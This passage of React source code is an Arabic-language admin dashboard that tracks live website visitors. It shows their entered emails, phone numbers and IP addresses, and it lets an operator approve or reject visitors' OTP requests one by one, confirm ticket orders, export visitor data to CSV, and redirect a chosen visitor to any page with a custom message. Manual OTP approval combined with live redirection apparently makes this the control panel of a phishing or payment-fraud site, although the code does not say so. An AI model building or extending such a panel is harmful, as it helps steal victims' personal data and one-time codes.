              )}
              <div className="flex items-center justify-between">
                <span className={`${xs} text-slate-400`}>وقت الإرسال</span>
                <span className={`${xs} text-slate-500`}>{getTimeDiff(req.created_at)}</span>
              </div>
              {req.status === "pending" ? (
                <div className="flex gap-1.5 pt-1">
                  <button
                    onClick={() => approveOtp(req.id)}
                    className={`flex-1 flex items-center justify-center gap-1 py-2 rounded-lg bg-emerald-500 text-white ${xs} font-bold hover:bg-emerald-600 active:scale-95 transition-all shadow-sm`}
                  >
                    <CheckCircle className="w-3.5 h-3.5" /> موافقة
                  </button>
                  <button
                    onClick={() => rejectOtp(req.id)}
                    className={`flex-1 flex items-center justify-center gap-1 py-2 rounded-lg bg-red-500 text-white ${xs} font-bold hover:bg-red-600 active:scale-95 transition-all shadow-sm`}
                  >
                    <XCircle className="w-3.5 h-3.5" /> رفض
                  </button>
                </div>
              ) : (
                <div className={`flex items-center justify-center gap-1.5 py-1.5 rounded-lg ${xs} font-semibold ${
                  req.status === "approved"
                    ? "bg-emerald-50 text-emerald-600 border border-emerald-100"
                    : "bg-red-50 text-red-500 border border-red-100"
                }`}>
                  {req.status === "approved"
                    ? <><CheckCircle className="w-3 h-3" /> تمت الموافقة</>
                    : <><XCircle className="w-3 h-3" /> تم الرفض</>
                  }
                </div>
              )}
            </div>
          ))}
        </div>
      </CollapsibleSection>
    );
  };

  const renderOrdersBookings = (compact: boolean) => {
    if (!visitorOrders.length && !visitorBookings.length) return null;
    const sm  = compact ? "text-[11px]" : "text-[12px]";
    const xs  = compact ? "text-[9px]"  : "text-[10px]";
    const pad = compact ? "p-2" : "p-3";

    return (
      <>
        {visitorOrders.length > 0 && (
          <CollapsibleSection sectionKey="orders" icon={ShoppingBag} iconColor="text-purple-500" bgColor="bg-purple-50" borderColor="border-purple-100" title="طلبات التذاكر" count={visitorOrders.length} compact={compact}>
            <div className={`${pad} space-y-1.5 max-h-[280px] overflow-y-auto`}>
              {visitorOrders.map(order => {
                const st = statusLabel(order.status);
                const isPending = order.status !== "confirmed" && order.status !== "rejected";
                return (
                  <div key={order.id} className="bg-slate-50 rounded-lg p-2.5 space-y-1.5">
                    <div className="flex items-center gap-2">
                      <Ticket className="w-4 h-4 text-purple-400 shrink-0" />
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2">
                          <span className={`${sm} font-medium text-slate-700`}>
                            {order.confirmation_number || order.id.slice(0, 8)}
                          </span>
                          <span className={`${xs} font-medium px-1.5 py-0.5 rounded-full ${st.color}`}>{st.text}</span>
                        </div>
                        <div className="flex items-center gap-2 mt-0.5">
                          <span className={`${xs} text-slate-500`}>{order.total} ر.س</span>
                          <span className={`${xs} text-slate-400`}>{getTimeDiff(order.created_at)}</span>
                        </div>
                      </div>
                    </div>
                    {isPending ? (
                      <div className="flex gap-1.5">
                        <button
                          onClick={() => updateOrderStatus(order.id, "confirmed")}
                          className={`flex-1 flex items-center justify-center gap-1 py-1.5 rounded-lg bg-emerald-50 text-emerald-600 ${xs} font-semibold hover:bg-emerald-100 transition-colors`}
                        >
                          <CheckCircle className="w-3 h-3" /> قبول
                        </button>
                        <button
                          onClick={() => updateOrderStatus(order.id, "rejected")}
                          className={`flex-1 flex items-center justify-center gap-1 py-1.5 rounded-lg bg-red-50 text-red-500 ${xs} font-semibold hover:bg-red-100 transition-colors`}
                        >
                          <XCircle className="w-3 h-3" /> رفض
                        </button>
                      </div>
                    ) : (
                      <div className={`flex items-center justify-center gap-1 py-1.5 rounded-lg ${xs} font-semibold ${
                        order.status === "confirmed" ? "bg-emerald-50 text-emerald-600" : "bg-red-50 text-red-500"
                      }`}>
                        {order.status === "confirmed"
                          ? <><CheckCircle className="w-3 h-3" /> تم القبول</>
                          : <><XCircle className="w-3 h-3" /> تم الرفض</>}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          </CollapsibleSection>
        )}

        {visitorBookings.length > 0 && (
          <CollapsibleSection sectionKey="bookings" icon={UtensilsCrossed} iconColor="text-teal-500" bgColor="bg-teal-50" borderColor="border-teal-100" title="حجوزات المطاعم" count={visitorBookings.length} compact={compact}>
            <div className={`${pad} space-y-1.5 max-h-[200px] overflow-y-auto`}>
              {visitorBookings.map(booking => {
                const st = statusLabel(booking.status);
                return (
                  <div key={booking.id} className="flex items-center gap-2 bg-slate-50 rounded-lg p-2.5">
                    <UtensilsCrossed className="w-4 h-4 text-teal-400 shrink-0" />
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2">
                        <span className={`${sm} font-medium text-slate-700`}>{booking.restaurant}</span>
                        <span className={`${xs} font-medium px-1.5 py-0.5 rounded-full ${st.color}`}>{st.text}</span>
                      </div>
                      <div className="flex items-center gap-2 mt-0.5">
                        <span className={`${xs} text-slate-500`}>{booking.booking_date} · {booking.guests} أشخاص</span>
                        <span className={`${xs} text-slate-400`}>{getTimeDiff(booking.created_at)}</span>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          </CollapsibleSection>
        )}
      </>
    );
  };

  const renderActionsLog = (compact: boolean) => {
    if (!selectedActions.length) return null;
    const actionStyles: Record<string, { icon: any; color: string; bg: string }> = {
      new_visitor:        { icon: UserPlus,        color: "text-emerald-500", bg: "bg-emerald-50" },
      page_view:          { icon: Navigation,      color: "text-blue-500",   bg: "bg-blue-50" },
      contact_message:    { icon: MessageSquare,   color: "text-indigo-500", bg: "bg-indigo-50" },
      restaurant_booking: { icon: UtensilsCrossed, color: "text-amber-500",  bg: "bg-amber-50" },
      ticket_purchase:    { icon: Ticket,          color: "text-purple-500", bg: "bg-purple-50" },
    };
    const sm = compact ? "text-[11px]" : "text-[12px]";
    const xs = compact ? "text-[9px]"  : "text-[10px]";

    return (
      <div className="border border-amber-100 rounded-xl overflow-hidden">
        <div className="bg-amber-50 px-3 py-1.5">
          <span className={`${sm} font-semibold text-amber-600`}>سجل الإجراءات</span>
        </div>
        <div className={`${compact ? "p-2 space-y-1 max-h-[150px]" : "p-3 space-y-1.5 max-h-[200px]"} overflow-y-auto`}>
          {selectedActions.map(action => {
            const style = actionStyles[action.action_type] || { icon: MousePointer, color: "text-slate-400", bg: "bg-slate-50" };
            const Icon = style.icon;
            return (
              <div key={action.id} className={`flex items-center gap-2 rounded-lg p-2 ${style.bg}`}>
                <Icon className={`w-3 h-3 ${style.color} shrink-0`} />
                <div className="flex-1 min-w-0">
                  <p className={`${sm} text-slate-700 truncate`}>{action.action_detail}</p>
                  <p className={`${xs} text-slate-400`}>{getTimeDiff(action.created_at)}</p>
                </div>
              </div>
            );
          })}
        </div>
      </div>
    );
  };

  const renderRedirectDropdown = (visitor: Visitor, compact: boolean) => {
    const sm = compact ? "text-[11px]" : "text-[13px]";
    return (
      <div className="border border-slate-200 rounded-xl overflow-hidden">
        <div className="bg-slate-50 px-3 py-1.5 border-b border-slate-100">
          <span className={`${compact ? "text-[11px]" : "text-[12px]"} font-semibold text-slate-600`}>توجيه لصفحة</span>
        </div>
        <div className="p-2.5 space-y-2">
          <select
            className={`w-full ${sm} border border-slate-200 rounded-lg px-3 py-2 bg-white text-slate-700 focus:outline-none focus:ring-2 focus:ring-violet-500/20 focus:border-violet-400 transition-all`}
            value={redirectPath}
            onChange={e => setRedirectPath(e.target.value)}
          >
            <option value="" disabled>اختر صفحة</option>
            {sitePages.map(p => <option key={p.path} value={p.path}>{p.label}</option>)}
          </select>
          <input
            type="text"
            placeholder="رسالة مخصصة (اختياري)..."
            value={redirectMessage}
            onChange={e => setRedirectMessage(e.target.value)}
            className={`w-full ${sm} border border-slate-200 rounded-lg px-3 py-2 bg-white text-slate-700 placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-violet-500/20 focus:border-violet-400 transition-all`}
            dir="rtl"
          />
          <div className="flex items-center gap-1.5">
            {notificationTypes.map(nt => (
              <button
                key={nt.key}
                onClick={() => setRedirectNotifType(nt.key)}
                className={`flex-1 text-[10px] py-1.5 rounded-lg border-2 transition-all font-medium ${
                  redirectNotifType === nt.key
                    ? `${nt.color} text-white border-transparent shadow-sm`
                    : "bg-white text-slate-500 border-slate-200 hover:border-slate-300"
                }`}
                title={nt.label}
              >
                {nt.icon}
              </button>
            ))}
          </div>
          <button
            onClick={() => {
              if (redirectPath) {
                redirectVisitor(visitor.id, redirectPath, redirectNotifType, redirectMessage.trim());
                setRedirectPath(""); setRedirectMessage("");
              }
            }}
            className={`w-full ${compact ? "py-2 text-[11px]" : "py-2.5 text-[13px]"} rounded-lg bg-violet-500 text-white font-medium hover:bg-violet-600 active:scale-95 transition-all`}
          >
            توجيه
          </button>
        </div>
      </div>
    );
  };

  // ─────────────────────────────────────────────
  // Derived
  // ─────────────────────────────────────────────
  const onlineCount = visitors.filter(v => v.is_online).length;
  const uniqueCountries = [...new Set(visitors.map(v => v.country))].filter(Boolean).sort();
  const uniqueDevices = [...new Set(visitors.map(v => v.device))].filter(Boolean);
  const searchLower = searchQuery.trim().toLowerCase();
  const filtered = visitors.filter(v => {
    if (filter === "online" && !v.is_online) return false;
    if (filter === "offline" && v.is_online) return false;
    if (filterCountry !== "all" && v.country !== filterCountry) return false;
    if (filterDevice !== "all" && v.device !== filterDevice) return false;
    if (searchLower && !(
      (v.name || "").toLowerCase().includes(searchLower) ||
      (v.email || "").toLowerCase().includes(searchLower) ||
      (v.phone || "").includes(searchLower) ||
      (v.ip_address || "").includes(searchLower)
    )) return false;
    return true;
  });
  const pendingOtps = visitorOtpRequests.filter(o => o.status === "pending");

  const exportFilteredCSV = useCallback(() => {
    playChime("success");
    const headers = ["الاسم","البريد","الهاتف","الدولة","الجهاز","المتصفح","الصفحة الحالية","متصل","آخر ظهور","الزيارات","الصفحات","IP"];
    const rows = filtered.map(v => [
      v.name || "زائر جديد",
      v.email || "",
      v.phone || "",
      v.country || "",
      v.device || "",
      v.browser || "",
      v.current_page_label || v.current_page || "",
      v.is_online ? "نعم" : "لا",
      new Date(v.last_seen).toLocaleString("ar-SA"),
      v.total_visits,
      v.pages_viewed,
      v.ip_address || "",
    ]);
    const bom = "\uFEFF";
    const csv = bom + [headers, ...rows].map(r => r.map(c => `"${String(c).replace(/"/g, '""')}"`).join(",")).join("\n");
    const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `visitors_${new Date().toISOString().slice(0, 10)}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  }, [filtered]);

  if (loading) {
    return (
      <div className="flex items-center justify-center h-[calc(100vh-120px)]">
        <div className="text-center">
          <div className="relative w-10 h-10 mx-auto mb-3">
            <div className="absolute inset-0 border-3 border-violet-500/30 rounded-full" />
            <div className="absolute inset-0 border-3 border-violet-500 border-t-transparent rounded-full animate-spin" />
          </div>
          <p className="text-[13px] text-slate-400">جاري تحميل الزوار...</p>
        </div>
      </div>
    );
  }

  return (
    <>
      {/* شريط التنبيهات الجانبي */}
      <div
        className="fixed left-4 top-1/2 -translate-y-1/2 z-50 flex flex-col gap-2 pointer-events-none"
        style={{ maxWidth: 260 }}
      >
        {sideAlerts.map(alert => (
          <div
            key={alert.id}
            className="pointer-events-auto bg-white border border-slate-200 rounded-xl shadow-lg shadow-slate-200/60 p-3 flex items-center gap-2.5 animate-in slide-in-from-left-4 duration-300"
            style={{ direction: "rtl" }}
          >
            <div className={`w-8 h-8 rounded-lg flex items-center justify-center shrink-0 text-[16px] ${alert.isNew ? "bg-emerald-50" : "bg-violet-50"}`}>
              {alert.actionIcon}
            </div>
            <div className="flex-1 min-w-0">
              <p className="text-[12px] font-semibold text-slate-700 truncate">{alert.visitorName}</p>
              <p className={`text-[10px] font-medium ${alert.isNew ? "text-emerald-500" : "text-violet-500"}`}>
                {alert.isNew ? "🟢 زائر جديد دخل الموقع" : alert.actionLabel}
              </p>
            </div>
            <button
              onClick={() => removeSideAlert(alert.id)}
              className="shrink-0 w-5 h-5 rounded-full bg-slate-100 flex items-center justify-center hover:bg-slate-200 transition-colors"
            >
              <X className="w-3 h-3 text-slate-400" />
            </button>
          </div>
        ))}
      </div>

      <div className="flex flex-col gap-3 h-[calc(100vh-120px)]" dir="rtl">

        {/* شريط المعلومات العلوي */}
        <div className="flex items-center justify-between gap-3 shrink-0">
          <div className="flex items-center gap-2.5">
            <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-violet-500 to-purple-600 flex items-center justify-center shadow-lg shadow-violet-500/20">
              <Users className="w-4.5 h-4.5 text-white" />
            </div>
            <div className="flex items-center gap-2.5">
              <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-emerald-50 border border-emerald-100/80">
                <div className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                <span className="text-[12px] font-bold text-emerald-600">{onlineCount}</span>
                <span className="text-[10px] text-slate-400">متصل</span>
              </div>
              <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-blue-50 border border-blue-100/80">
                <Users className="w-3 h-3 text-blue-400" />
                <span className="text-[12px] font-bold text-blue-600">{visitors.length}</span>
                <span className="text-[10px] text-slate-400">إجمالي</span>
              </div>
              {pendingOtps.length > 0 && (
                <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-gradient-to-r from-violet-50 to-purple-50 border border-violet-200/80 animate-pulse">
                  <Shield className="w-3 h-3 text-violet-500" />
                  <span className="text-[12px] font-bold text-violet-600">{pendingOtps.length}</span>
                  <span className="text-[10px] text-violet-400">OTP</span>
                </div>
              )}
            </div>
          </div>
          <div className="flex items-center gap-2">
            <button
              onClick={e => { createRipple(e); deleteAll(); }}
              className="flex items-center gap-1.5 px-3 py-2 rounded-xl bg-red-50 text-red-500 text-[11px] font-medium hover:bg-red-100 transition-colors relative overflow-hidden"
            >
              <WifiOffBulk className="w-3.5 h-3.5" /> حذف غير المتصلين ({visitors.filter(v => !v.is_online).length})
            </button>
            <button
              onClick={e => { createRipple(e); playChime("click"); setSelectMode(!selectMode); if (selectMode) setSelectedIds(new Set()); }}
              className={`flex items-center gap-1.5 px-3 py-2 rounded-xl text-[11px] font-medium transition-all relative overflow-hidden ${
                selectMode ? "bg-blue-500 text-white" : "bg-slate-100 text-slate-600 hover:bg-slate-200"
              }`}
            >
              <CheckSquare className="w-3.5 h-3.5" />
              {selectMode ? "إلغاء التحديد" : "تحديد محادثات"}
            </button>
            {selectMode && selectedIds.size > 0 && (
              <button
                onClick={deleteSelected}
                className="flex items-center gap-1.5 px-3 py-2 rounded-xl bg-red-500 text-white text-[11px] font-medium hover:bg-red-600 transition-colors"
              >
                <Trash2 className="w-3.5 h-3.5" /> حذف المحدد ({selectedIds.size})
              </button>
            )}
          </div>
        </div>

        {/* المحتوى الرئيسي */}
        <div className="flex flex-col lg:flex-row gap-4 flex-1 min-h-0 overflow-auto lg:overflow-hidden">

          {/* قائمة الزوار */}
          <div className="w-full lg:w-[280px] xl:w-[300px] shrink-0 flex flex-col gap-2 overflow-y-auto scrollbar-thin">
            <div className="bg-white rounded-2xl border border-slate-200 p-3 space-y-2 shrink-0">
              <button
                onClick={() => { playChime("click"); setShowTrash(!showTrash); setSelectMode(false); setSelectedIds(new Set()); }}
                className={`w-full flex items-center justify-center gap-1.5 py-2 rounded-xl text-[11px] font-medium transition-all ${
                  showTrash ? "bg-amber-500 text-white" : "bg-amber-50 text-amber-600 hover:bg-amber-100"
                }`}
              >
                <Archive className="w-3.5 h-3.5" />
                {showTrash ? "العودة للزوار" : `سلة المحذوفات (${deletedVisitors.length})`}
              </button>
              {!showTrash && (
                <>
                  <div className="relative">
                    <Search className="absolute right-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-slate-400 pointer-events-none" />
                    <input
                      type="text"
                      value={searchQuery}
                      onChange={e => setSearchQuery(e.target.value)}
                      placeholder="بحث بالاسم أو البريد أو الهاتف..."
                      className="w-full py-2 pr-8 pl-2.5 rounded-xl bg-slate-50 border border-slate-100 text-[11px] text-slate-700 placeholder:text-slate-400 focus:outline-none focus:ring-1 focus:ring-blue-300 focus:border-blue-300 transition-all"
                    />
                    {searchQuery && (
                      <button
                        onClick={() => setSearchQuery("")}
                        className="absolute left-2.5 top-1/2 -translate-y-1/2 w-4 h-4 rounded-full bg-slate-200 flex items-center justify-center hover:bg-slate-300 transition-colors"
                      >
                        <X className="w-2.5 h-2.5 text-slate-500" />
                      </button>
                    )}
                  </div>
                  <div className="flex gap-1 bg-slate-50 rounded-xl p-1">
                    {[
                      { key: "all"     as const, label: "الكل",     count: visitors.length },
                      { key: "online"  as const, label: "متصل",     count: onlineCount },
                      { key: "offline" as const, label: "غير متصل", count: visitors.length - onlineCount },
                    ].map(tab => (
                      <button
                        key={tab.key}
                        onClick={() => setFilter(tab.key)}
                        className={`flex-1 py-1.5 rounded-lg text-[10px] font-medium transition-all ${
                          filter === tab.key ? "bg-blue-500 text-white shadow-sm" : "text-slate-500 hover:bg-white"
                        }`}
                      >
                        {tab.label} ({tab.count})
                      </button>
                    ))}
                  </div>
                  <div className="flex gap-1.5">
                    <select
                      value={filterCountry}
                      onChange={e => setFilterCountry(e.target.value)}
                      className={`flex-1 py-1.5 px-2 rounded-lg text-[10px] font-medium border transition-all appearance-none cursor-pointer ${
                        filterCountry !== "all"
                          ? "bg-violet-50 border-violet-200 text-violet-600"
                          : "bg-slate-50 border-slate-100 text-slate-500"
                      }`}
                    >
                      <option value="all">🌍 كل الدول</option>
                      {uniqueCountries.map(c => (
                        <option key={c} value={c}>{countryFlag(c)} {c}</option>
                      ))}
                    </select>
                    <select
                      value={filterDevice}
                      onChange={e => setFilterDevice(e.target.value)}
                      className={`flex-1 py-1.5 px-2 rounded-lg text-[10px] font-medium border transition-all appearance-none cursor-pointer ${
                        filterDevice !== "all"
                          ? "bg-sky-50 border-sky-200 text-sky-600"
                          : "bg-slate-50 border-slate-100 text-slate-500"
                      }`}
                    >
                      <option value="all">📱 كل الأجهزة</option>
                      <option value="mobile">📱 جوال</option>
                      <option value="desktop">💻 كمبيوتر</option>
                      <option value="tablet">📟 تابلت</option>
                    </select>
                  </div>
                  {(filterCountry !== "all" || filterDevice !== "all") && (
                    <button
                      onClick={() => { setFilterCountry("all"); setFilterDevice("all"); }}
                      className="w-full py-1.5 rounded-lg bg-slate-100 text-slate-500 text-[10px] font-medium hover:bg-slate-200 transition-colors flex items-center justify-center gap-1"
                    >
                      <X className="w-3 h-3" /> إزالة الفلاتر
                    </button>
                  )}
                  <button
                    onClick={e => { createRipple(e); exportFilteredCSV(); }}
                    className="w-full py-1.5 rounded-lg bg-emerald-50 text-emerald-600 text-[10px] font-medium hover:bg-emerald-100 transition-colors flex items-center justify-center gap-1 relative overflow-hidden border border-emerald-100"
                  >
                    <Download className="w-3 h-3" /> تصدير CSV ({filtered.length} زائر)
                  </button>
                  {(filter !== "all" || filterCountry !== "all" || filterDevice !== "all") && filtered.length !== visitors.length && (
                    <div className="flex items-center justify-center gap-1.5 py-1.5 px-3 rounded-lg bg-blue-50 border border-blue-100">
                      <span className="text-[10px] font-bold text-blue-600">{filtered.length}</span>
                      <span className="text-[10px] text-blue-400">من</span>
                      <span className="text-[10px] font-bold text-blue-600">{visitors.length}</span>
                      <span className="text-[10px] text-blue-400">زائر</span>
                    </div>
                  )}
                </>
              )}
            </div>

            {showTrash ? (
              <div className="space-y-1.5">
                {deletedVisitors.length > 0 && (
                  <div className="flex gap-1.5 mb-2">
                    <button
                      onClick={() => setConfirmDelete({ type: "all" })}
                      className="flex-1 flex items-center justify-center gap-1 py-2 rounded-xl bg-red-50 text-red-500 text-[10px] font-medium hover:bg-red-100 transition-colors"
                    >
                      <Trash2 className="w-3 h-3" /> حذف نهائي للكل
                    </button>
                    <button
                      onClick={restoreAllVisitors}
                      className="flex-1 flex items-center justify-center gap-1 py-2 rounded-xl bg-emerald-50 text-emerald-600 text-[10px] font-medium hover:bg-emerald-100 transition-colors"
                    >
                      <RotateCcw className="w-3 h-3" /> استعادة الكل
                    </button>
                  </div>
                )}
                {deletedVisitors.map(visitor => (
                  <div key={visitor.id} className="bg-white rounded-xl border border-slate-100 p-2.5">
                    <div className="flex items-center gap-2">
                      <div className="w-8 h-8 rounded-full bg-slate-100 flex items-center justify-center text-[12px] font-bold text-slate-400">
                        {(visitor.name || "ز")[0]}
                      </div>
                      <div className="flex-1 min-w-0">
                        <span className="text-[12px] font-semibold text-slate-600 truncate block">{visitor.name || "زائر جديد"}</span>
                        <span className="text-[9px] text-slate-400">{visitor.device === "mobile" ? "Mobile" : "Desktop"}</span>
                      </div>
                      <div className="flex gap-1 shrink-0">
                        <button onClick={() => restoreVisitor(visitor.id)} className="p-1 rounded-lg bg-emerald-50 text-emerald-500 hover:bg-emerald-100 transition-colors">
                          <RotateCcw className="w-3 h-3" />
                        </button>
                        <button onClick={() => setConfirmDelete({ type: "single", id: visitor.id })} className="p-1 rounded-lg bg-red-50 text-red-500 hover:bg-red-100 transition-colors">
                          <Trash2 className="w-3 h-3" />
                        </button>
                      </div>
                    </div>
                  </div>
                ))}
                {!deletedVisitors.length && (
                  <div className="text-center py-8 text-slate-400 text-[12px]">سلة المحذوفات فارغة</div>
                )}
              </div>
            ) : (
              <div className="space-y-1.5">
                {filtered.map(visitor => {
                  const isSelected = selected?.id === visitor.id;
                  return (
                    <SwipeToDelete
                      key={visitor.id}
                      onDelete={() => deleteSingle(visitor.id)}
                    >
                    <div
                      onClick={() => {
                        if (!selectMode) {
                          playChime(isSelected ? "whoosh" : "pop");
                          setSelected(isSelected ? null : visitor);
                        }
                      }}
                      className={`bg-white rounded-xl border transition-all duration-200 p-2.5 cursor-pointer hover:shadow-sm ${
                        isSelected ? "border-blue-400 bg-blue-50/40 shadow-sm" : "border-slate-100 hover:border-slate-200"
                      } ${flashVisitorId === visitor.id ? "ring-2 ring-violet-400 bg-violet-50/60" : ""}`}
                    >
                      <div className="flex items-center gap-2">
                        {selectMode && (
                          <button onClick={e => { e.stopPropagation(); toggleSelect(visitor.id); }} className="shrink-0">
                            {selectedIds.has(visitor.id)
                              ? <CheckSquare className="w-4 h-4 text-blue-500" />
                              : <Square className="w-4 h-4 text-slate-300" />}
                          </button>
                        )}
                        <div className="relative shrink-0">
                          <div className={`w-9 h-9 rounded-full flex items-center justify-center text-[13px] font-bold ${
                            visitor.is_online ? "bg-emerald-50 text-emerald-600" : "bg-slate-100 text-slate-400"
                          }`}>
                            {(visitor.name || "ز")[0]}
                          </div>
                          <span className={`absolute -bottom-0.5 -left-0.5 w-2.5 h-2.5 rounded-full border-2 border-white ${
                            visitor.is_online ? "bg-emerald-400" : "bg-slate-300"
                          }`} />
                        </div>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center justify-between gap-1">
                            <span className="text-[12px] font-semibold text-slate-700 truncate">{visitor.name || "زائر جديد"}</span>
                            {visitor.is_online
                              ? <span className="text-[9px] font-medium text-emerald-500 bg-emerald-50 px-1.5 py-0.5 rounded-full shrink-0">متصل</span>
                              : <span className="text-[9px] font-medium text-slate-400 bg-slate-50 px-1.5 py-0.5 rounded-full shrink-0">غير متصل</span>}
                          </div>
                          <div className="flex items-center gap-1 mt-0.5">
                            <MapPin className="w-2.5 h-2.5 text-slate-300 shrink-0" />
                            <span className="text-[10px] text-slate-400 truncate">{visitor.current_page_label}</span>
                          </div>
                          <div className="flex items-center gap-1 mt-0.5">
                            <Clock className="w-2.5 h-2.5 text-slate-300 shrink-0" />
                            <span className="text-[9px] text-slate-400">{getTimeDiff(visitor.last_seen)}</span>
                          </div>
                        </div>
                      </div>
                    </div>
                    </SwipeToDelete>
                  );
                })}
                {!filtered.length && (
                  <div className="text-center py-8 text-slate-400 text-[12px]">لا يوجد زوار</div>
                )}
              </div>
            )}
          </div>

          {/* لوحة التفاصيل - Desktop */}
          <div className="flex-1 hidden lg:block min-h-0">
            {selected ? (
              <div className="bg-white rounded-2xl border border-slate-200 h-full flex flex-col overflow-hidden">
                <div className="p-4 border-b border-slate-100 shrink-0">
                  <div className="flex items-center gap-3">
                    <div className="relative">
                      <div className={`w-12 h-12 rounded-2xl flex items-center justify-center text-[18px] font-bold ${
                        selected.is_online ? "bg-emerald-50 text-emerald-600" : "bg-slate-100 text-slate-400"
                      }`}>
                        {(selected.name || "ز")[0]}
                      </div>
                      <span className={`absolute -bottom-1 -left-1 w-3.5 h-3.5 rounded-full border-[2.5px] border-white ${
                        selected.is_online ? "bg-emerald-400" : "bg-slate-300"
                      }`} />
                    </div>
                    <div className="flex-1">
                      <div className="flex items-center gap-2 flex-wrap">
                        <h2 className="text-[20px] font-bold text-slate-800">{selected.name || "زائر جديد"}</h2>
                        <span className={`inline-flex items-center gap-1.5 text-[11px] font-semibold px-2.5 py-1 rounded-full border ${
                          selected.is_online
                            ? "bg-emerald-50 text-emerald-600 border-emerald-200"
                            : "bg-slate-50 text-slate-400 border-slate-200"
                        }`}>
                          {selected.is_online
                            ? <><span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" /> متصل</>
                            : <><span className="w-1.5 h-1.5 rounded-full bg-slate-300" /> غير متصل</>}
                        </span>
                        {pendingOtps.length > 0 && (
                          <span className="inline-flex items-center gap-1 text-[10px] font-bold px-2 py-0.5 rounded-full bg-violet-100 text-violet-600 animate-pulse">
                            🔐 {pendingOtps.length} OTP ينتظر
                          </span>
                        )}
                      </div>
                      <div className="flex items-center gap-1.5 mt-1">
                        <Eye className="w-3.5 h-3.5 text-blue-400" />
                        <span className="text-[13px] text-blue-500 font-medium">يتصفح: {selected.current_page_label}</span>
                      </div>
                    </div>
                    <button
                      onClick={() => deleteSingle(selected.id)}
                      className="p-2 rounded-xl bg-red-50 text-red-400 hover:bg-red-100 transition-colors"
                    >
                      <Trash2 className="w-4 h-4" />
                    </button>
                  </div>
                </div>

                <div className="p-4 space-y-3 flex-1 overflow-y-auto scrollbar-thin">
                  {visitorOrders.some(o => o.status !== "confirmed" && o.status !== "rejected") && (
                    <div className="border border-amber-100 rounded-xl overflow-hidden">
                      <div className="bg-amber-50 px-4 py-2 flex items-center gap-2">
                        <AlertCircle className="w-3.5 h-3.5 text-amber-500" />
                        <span className="text-[12px] font-semibold text-amber-600">طلبات تنتظر الرد</span>
                      </div>
                      <div className="p-3 space-y-2">
                        {visitorOrders
                          .filter(o => o.status !== "confirmed" && o.status !== "rejected")
                          .map(order => (
                            <div key={order.id} className="flex gap-2">
                              <div className="flex-1 min-w-0">
                                <p className="text-[11px] text-slate-500 mb-1.5">
                                  {order.confirmation_number || order.id.slice(0, 8)} · {order.total} ر.س
                                </p>
                                <div className="flex gap-2">
                                  <button
                                    onClick={() => updateOrderStatus(order.id, "confirmed")}
                                    className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-emerald-500 text-white text-[12px] font-semibold hover:bg-emerald-600 transition-colors shadow-sm"
                                  >
                                    <CheckCircle className="w-4 h-4" /> موافقة
                                  </button>
                                  <button
                                    onClick={() => updateOrderStatus(order.id, "rejected")}
                                    className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-red-500 text-white text-[12px] font-semibold hover:bg-red-600 transition-colors shadow-sm"
                                  >
                                    <XCircle className="w-4 h-4" /> رفض
                                  </button>
                                </div>
                              </div>
                            </div>
                          ))}
                      </div>
                    </div>
                  )}

                  {(selected.email || selected.phone) && (
                    <div className="border border-purple-100 rounded-xl overflow-hidden">
                      <div className="bg-purple-50 px-4 py-2">
                        <span className="text-[12px] font-semibold text-purple-600">بيانات الزائر المدخلة</span>
                      </div>
                      <div className="p-3 space-y-2">
                        {selected.email && (
                          <div className="flex items-center gap-2.5 bg-slate-50 rounded-lg p-2.5">
                            <Globe className="w-3.5 h-3.5 text-slate-400" />
                            <div>
                              <p className="text-[10px] text-slate-400">البريد الإلكتروني</p>
                              <p className="text-[12px] font-medium text-slate-700" dir="ltr">{selected.email}</p>
                            </div>
                          </div>
                        )}
                        {selected.phone && (
                          <div className="flex items-center gap-2.5 bg-slate-50 rounded-lg p-2.5">
                            <Smartphone className="w-3.5 h-3.5 text-slate-400" />
                            <div>
                              <p className="text-[10px] text-slate-400">رقم الجوال</p>
                              <p className="text-[12px] font-medium text-slate-700" dir="ltr">{selected.phone}</p>
                            </div>
                          </div>
                        )}
                      </div>
                    </div>
                  )}

                  <div className="border border-blue-100 rounded-xl overflow-hidden">
                    <div className="bg-blue-50 px-4 py-2">
                      <span className="text-[12px] font-semibold text-blue-600">معلومات الزائر</span>
                    </div>
                    <div className="p-3 grid grid-cols-2 gap-2">
                      {[
                        { label: "الجهاز",    value: selected.device === "mobile" ? "جوال" : "كمبيوتر", icon: selected.device === "mobile" ? Smartphone : Monitor },
                        { label: "المتصفح",   value: selected.browser, icon: Globe },
                        { label: "الدولة",    value: `${countryFlag(selected.country)} ${selected.country}`, icon: MapPin },
                        { label: "آخر نشاط", value: getTimeDiff(selected.last_seen), icon: Clock },
                      ].map(info => (
                        <div key={info.label} className="flex items-center gap-2 bg-slate-50 rounded-lg p-2.5">
                          <info.icon className="w-3.5 h-3.5 text-slate-400 shrink-0" />
                          <div>
                            <p className="text-[9px] text-slate-400">{info.label}</p>
                            <p className="text-[12px] font-medium text-slate-700">{info.value}</p>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>

                  <div className="border border-emerald-100 rounded-xl overflow-hidden">
                    <div className="bg-emerald-50 px-4 py-2">
                      <span className="text-[12px] font-semibold text-emerald-600">إحصائيات التصفح</span>
                    </div>
                    <div className="p-3 grid grid-cols-3 gap-2">
                      {[
                        { label: "إجمالي الزيارات",  value: String(selected.total_visits  || 0) },
                        { label: "الصفحات المشاهدة", value: String(selected.pages_viewed  || 0) },
                        { label: "مدة الجلسة",        value: getDuration(selected.session_start) },
                      ].map(stat => (
